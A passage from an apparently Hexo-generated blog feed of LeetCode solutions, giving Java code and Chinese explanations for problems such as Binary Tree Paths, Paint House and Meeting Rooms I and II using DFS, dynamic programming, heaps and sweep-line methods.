<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用DFS+回溯法的思想，寻找路径</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q257BinaryTreePaths</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; paths = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        binaryTreePathsHelper(root, <span class="keyword">new</span> StringBuilder());</span><br><span class="line">        <span class="keyword">return</span> paths;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">binaryTreePathsHelper</span><span class="params">(TreeNode root, StringBuilder s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        String tmp = String.format(<span class="string">"%d-&gt;"</span>, root.val);</span><br><span class="line">        s.append(tmp);</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">            paths.add(s.substring(<span class="number">0</span>, s.length() - <span class="number">2</span>));</span><br><span class="line">            s.delete(s.length() - tmp.length(), s.length());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        binaryTreePathsHelper(root.left, s);</span><br><span class="line">        binaryTreePathsHelper(root.right, s);</span><br><span class="line">        s.delete(s.length() - tmp.length(), s.length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一种小的修改是首先求出路径，然后再转化为字符串打印；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q257BinaryTreePaths</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;List&lt;Integer&gt;&gt; paths = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        binaryTreePathsHelper(root, <span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">        <span class="keyword">for</span> (List&lt;Integer&gt; list: paths) &#123;</span><br><span class="line">            StringBuilder s = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (Integer i: list) &#123;</span><br><span class="line">                s.append(String.format(<span class="string">"%d-&gt;"</span>, i));</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(s.substring(<span class="number">0</span>, s.length() - <span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">binaryTreePathsHelper</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        list.add(root.val);</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">            paths.add(<span class="keyword">new</span> ArrayList&lt;&gt;(list));</span><br><span class="line">            list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        binaryTreePathsHelper(root.left, list);</span><br><span class="line">        binaryTreePathsHelper(root.right, list);</span><br><span class="line">        list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行时间基本一致。</p>
<p>在论坛上发现一个非常优美的方案，直接使用String，而不是StringBuilder，利用参数传递省去了<code>s.delete</code>操作。所以速度反而非常快。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; answer = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="keyword">null</span>) searchBT(root, <span class="string">""</span>, answer);</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">searchBT</span><span class="params">(TreeNode root, String path, List&lt;String&gt; answer)</span> </span>&#123;</span><br><span class="line">    String local = path + root.val;</span><br><span class="line">    <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span>) answer.add(local);</span><br><span class="line">    <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) searchBT(root.left, local + <span class="string">"-&gt;"</span>, answer);</span><br><span class="line">    <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) searchBT(root.right, local + <span class="string">"-&gt;"</span>, answer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[256. Paint House]]></title>
      <url>/wiki/2017/10/30/Leetcode-256-Paint-House/</url>
      <content type="html"><![CDATA[<p>There are a row of $n$ houses, each house can be painted with one of the three colors: red, blue or green. The cost of painting each house with a certain color is different. You have to paint all the houses such that no two adjacent houses have the same color.</p>
<p>The cost of painting each house with a certain color is represented by a $n \times 3$ cost matrix. For example, <code>costs[0][0]</code> is the cost of painting house 0 with color red; <code>costs[1][2]</code> is the cost of painting house 1 with color green, and so on… Find the minimum cost to paint all houses.</p>
<p><strong>Note</strong>: All costs are positive integers.</p>
<p>Example</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Given costs = [[14,2,11],[11,14,5],[14,3,10]] return 10</span><br><span class="line">house 0 is blue, house 1 is green, house 2 is blue, 2 + 5 + 3 = 10</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目LeetCode要收费的，相应的<a href="https://www.lintcode.com/problem/paint-house/description">LintCode链接</a>。</p>
<p>题目要求给一排房子刷漆(红绿蓝三种颜色)，相邻房子的油漆颜色不能相同，而且每个房子的每种颜色的价格都是不一样的。最后让我们求给所有房子刷漆的最小费用。这道题目利用的是动态规划，需要维护一个二维的数组dp，其中dp[i][j]表示从第0套房子刷到第$i$套房子，其中第$i$套房子用颜色$j$的最小花费，递推式为:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = dp[i][j] + min(dp[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">3</span>], dp[i - <span class="number">1</span>][(j + <span class="number">2</span>) % <span class="number">3</span>])；</span><br></pre></td></tr></table></figure>
<p>主要思想为第$i$房子有三种颜色可以刷，但如果当前房子刷了任意一种颜色，那么前一个房子$i - 1$肯定只能刷其他两种颜色($(j + 1) % 3, (j + 2) % 3$)。所以刷到当前房子用某种颜色的最小花费等于当前房子刷颜色的钱，加上刷到前一个房子用不同颜色的最小花费。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCost</span><span class="params">(<span class="keyword">int</span>[][] costs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (costs == <span class="keyword">null</span> || costs.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = costs.clone();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; dp.length; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j)</span><br><span class="line">            dp[i][j] += Math.min(dp[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">3</span>], dp[i - <span class="number">1</span>][(j + <span class="number">2</span>) % <span class="number">3</span>]);</span><br><span class="line">            </span><br><span class="line">    Arrays.sort(dp[dp.length - <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> dp[dp.length - <span class="number">1</span>][<span class="number">0</span>];    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[253. Meeting Rooms II]]></title>
      <url>/wiki/2017/10/30/Leetcode-253-Meeting-Rooms-II/</url>
      <content type="html"><![CDATA[<p>Given an array of meeting time intervals consisting of start and end times $[[s_1,e_1],[s_2,e_2],…], (s_i &lt; e_i)$, find the minimum number of conference rooms required.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given intervals = [(0,30),(5,10),(15,20)], return 2.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>给定会议时间间隔，要求所需的最小的会议室数量。将会议时间间隔按照会议开始时间排序，如果后一个会议的开始时间小于上一个会议的结束时间，则需要多一个会议室。如果有$k$个会议室，如果后一个会议的开始时间小于所有会议室的会议结束时间，则需要多一个会议室；如果不需要，则将会议安排到<em>任意</em>已经结束会议的会议室。时间复杂度为$O(kn)$，其中$n$为会议数量，$k$为需要的会议室数量。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMeetingRooms</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    intervals.sort(Comparator.comparing(o -&gt; o.start));</span><br><span class="line">    List&lt;Integer&gt; meetingRooms = <span class="keyword">new</span> ArrayList&lt;&gt;();     <span class="comment">// 每个会议室的会议结束时间</span></span><br><span class="line">    meetingRooms.add(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (Interval interval : intervals) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 寻找任意一个已经结束会议的会议室</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; meetingRooms.size() &amp;&amp; meetingRooms.get(i) &gt; interval.start) i++;</span><br><span class="line">        <span class="comment">// 如果没有，则增加一个会议室</span></span><br><span class="line">        <span class="keyword">if</span> (i == meetingRooms.size()) meetingRooms.add(interval.end);</span><br><span class="line">        <span class="comment">// 否则，将该会议安排到寻找到的会议室，并更新结束时间</span></span><br><span class="line">        <span class="keyword">else</span> meetingRooms.set(i, interval.end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> meetingRooms.size();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以将会议安排到<em>最早结束会议</em>的会议室，时间复杂度为$O(k^2n)$.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMeetingRooms</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals == <span class="keyword">null</span> || intervals.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    intervals.sort(Comparator.comparing(o -&gt; o.start));</span><br><span class="line">    List&lt;Integer&gt; meetingRooms = <span class="keyword">new</span> ArrayList&lt;&gt;();     <span class="comment">// 每个会议室的会议结束时间</span></span><br><span class="line">    meetingRooms.add(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (Interval interval : intervals) &#123;</span><br><span class="line">        <span class="comment">// min是最早结束会议的会议室</span></span><br><span class="line">        <span class="keyword">int</span> min = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 寻找min</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; meetingRooms.size(); i++)</span><br><span class="line">            <span class="keyword">if</span> (meetingRooms.get(i) &lt; meetingRooms.get(min))  min = i;</span><br><span class="line">        <span class="comment">// 如果最早结束会议的会议室仍旧不能满足该会议的时间，则增加一个会议室</span></span><br><span class="line">        <span class="keyword">if</span> (meetingRooms.get(min) &gt; interval.start)  meetingRooms.add(interval.end);</span><br><span class="line">        <span class="comment">// 否则，将该会议安排到寻找到的会议室，并更新结束时间</span></span><br><span class="line">        <span class="keyword">else</span> meetingRooms.set(min, interval.end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> meetingRooms.size();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用优先级队列保存会议室的结束时间，而不是数组，每次<code>poll()</code>会提取<em>最早结束</em>的会议室，优化了时间复杂度，时间复杂度为$O(n\log n)$.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMeetingRooms</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals == <span class="keyword">null</span> || intervals.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    intervals.sort(Comparator.comparing(o-&gt;o.start));</span><br><span class="line">    PriorityQueue&lt;Integer&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    queue.offer(intervals.get(<span class="number">0</span>).end);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; intervals.size(); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals.get(i).start &lt; queue.peek()) count++;</span><br><span class="line">        <span class="keyword">else</span> queue.poll();</span><br><span class="line">        queue.offer(intervals.get(i).end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是另一类方法<a href="https://en.wikipedia.org/wiki/Sweep_line_algorithm">扫描线算法</a>：</p>
<p>扫描线（sweep line)：将区间在x轴上画出来，并用一条垂直于x轴的线作为扫描线从左至右扫描，会很容易得出答案，即与扫描线相交的区间的数量的最大值为所求答案。</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/sweep_line.png?imageslim" alt="sweep_line"></p>
<p>但是在程序中我们怎样表示这种思想呢？ </p>
<ul>
<li>对所有点进行标记，区分起始点和终止点 </li>
<li>对所有点进行排序 </li>
<li>依次遍历每个点，遇到起始点+1，遇到终止点-1，并更新记录最大值</li>
</ul>
<p>对所有点进行标记有几种方法</p>
<ul>
<li>第一种方法是用两个一维数组来做，分别保存起始时间和结束时间，然后各自排序，定义结果变量<code>minRooms</code>和结束时间指针<code>endpos</code>，然后我们开始遍历，如果当前起始时间<code>start[i]</code>小于结束时间指针的时间<code>ends[endpos]</code>，则结果自增1，反之结束时间指针自增1，这样我们可以找出重叠的时间段，从而安排新的会议室，参见代码如下：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMeetingRooms</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals == <span class="keyword">null</span> || intervals.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] starts = <span class="keyword">new</span> <span class="keyword">int</span>[intervals.size()];   <span class="comment">// 保存会议开始时间</span></span><br><span class="line">    <span class="keyword">int</span>[] ends = <span class="keyword">new</span> <span class="keyword">int</span>[intervals.size()];     <span class="comment">// 保存会议结束时间</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; intervals.size(); i++) &#123;</span><br><span class="line">        starts[i] = intervals.get(i).start;</span><br><span class="line">        ends[i] = intervals.get(i).end;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 各自排序</span></span><br><span class="line">    Arrays.sort(starts);</span><br><span class="line">    Arrays.sort(ends);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 扫描线段</span></span><br><span class="line">    <span class="keyword">int</span> minRooms = <span class="number">0</span>, endpos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; intervals.size(); i++)</span><br><span class="line">        <span class="keyword">if</span> (starts[i] &lt; ends[endpos]) minRooms++;</span><br><span class="line">        <span class="keyword">else</span> endpos++;</span><br><span class="line">    <span class="keyword">return</span> minRooms;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一种更好的办法是，直接用+1表示开始时间点，用-1表示结束时间点，而不用分别在两个数组中存储。可以使用<code>TreeMap</code>自动实现分类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minMeetingRooms</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals == <span class="keyword">null</span> || intervals.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    TreeMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> TreeMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> minRooms = <span class="number">0</span>;           <span class="comment">// 总共所需要的会议室</span></span><br><span class="line">    <span class="keyword">int</span> currentRooms = <span class="number">0</span>;       <span class="comment">// 现在使用的会议室数量</span></span><br><span class="line">    <span class="comment">// 会议开始时间为1，结束时间为-1</span></span><br><span class="line">    <span class="keyword">for</span> (Interval interval : intervals) &#123;</span><br><span class="line">        map.put(interval.start, map.getOrDefault(interval.start, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        map.put(interval.end, map.getOrDefault(interval.end, <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 扫描</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k : map.keySet()) &#123;</span><br><span class="line">        currentRooms += map.get(k);</span><br><span class="line">        minRooms = Math.max(minRooms, currentRooms);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minRooms; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Heap </tag>
            
            <tag> Greedy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[252. Meeting Rooms]]></title>
      <url>/wiki/2017/10/30/Leetcode-252-Meeting-Rooms/</url>
      <content type="html"><![CDATA[<p>Given an array of meeting time intervals consisting of start and end times $[[s_1,e_1],[s_2,e_2],…], (s_i &lt; e_i)$, determine if a person could attend all meetings.</p>
<p>Example</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given intervals = [[0,30],[5,10],[15,20]], return false.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目在LeetCode上要收费，参见<a href="https://www.lintcode.com/problem/meeting-rooms/description">LintCode</a>。</p>
<p>确认可以参加所有会议，即会议时间不重叠。将会议按照会议开始时间排序，如果前面的会议结束时间小于后面的会议开始时间，则不会产生重叠。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition of Interval:</span></span><br><span class="line"><span class="comment"> * public class Interval &#123;</span></span><br><span class="line"><span class="comment"> *     int start, end;</span></span><br><span class="line"><span class="comment"> *     Interval(int start, int end) &#123;</span></span><br><span class="line"><span class="comment"> *         this.start = start;</span></span><br><span class="line"><span class="comment"> *         this.end = end;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canAttendMeetings</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    Collections.sort(intervals, Comparator.comparing(o -&gt; o.start));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; intervals.size(); i++)</span><br><span class="line">        <span class="keyword">if</span> (intervals.get(i).start &lt; intervals.get(i - <span class="number">1</span>).end) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[671. Second Minimum Node In a Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-671-Second-Minimum-Node-In-a-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a non-empty special binary tree consisting of nodes with the non-negative value, where each node in this tree has exactly <code>two</code> or <code>zero</code> sub-node. If the node has two sub-nodes, then this node’s value is the smaller value among its two sub-nodes.</p>
<p>Given such a binary tree, you need to output the second minimum value in the set made of all the nodes’ value in the whole tree.</p>
<p>If no such second minimum value exists, output -1 instead.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  2   5</span><br><span class="line">     / \</span><br><span class="line">    5   7</span><br><span class="line"></span><br><span class="line">Output: 5</span><br><span class="line">Explanation: The smallest value is 2, the second smallest value is 5.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"></span><br><span class="line">Output: -1</span><br><span class="line">Explanation: The smallest value is 2, but there isn&apos;t any second smallest value.</span><br></pre></td></tr></table></figure>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[241. Different Ways to Add Parentheses]]></title>
      <url>/wiki/2017/10/30/Leetcode-241-Different-Ways-to-Add-Parentheses/</url>
      <content type="html"><![CDATA[<p>Given a string of numbers and operators, return all possible results from computing all the different possible ways to group numbers and operators. The valid operators are <code>+</code>, <code>-</code> and <code>*</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;2-1-1&quot;</span><br><span class="line">Output: [0, 2]</span><br><span class="line">Explanation: </span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;2*3-4*5&quot;</span><br><span class="line">Output: [-34, -14, -10, -10, 10]</span><br><span class="line">Explanation: </span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Divide and Conquer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[240. Search a 2D Matrix II]]></title>
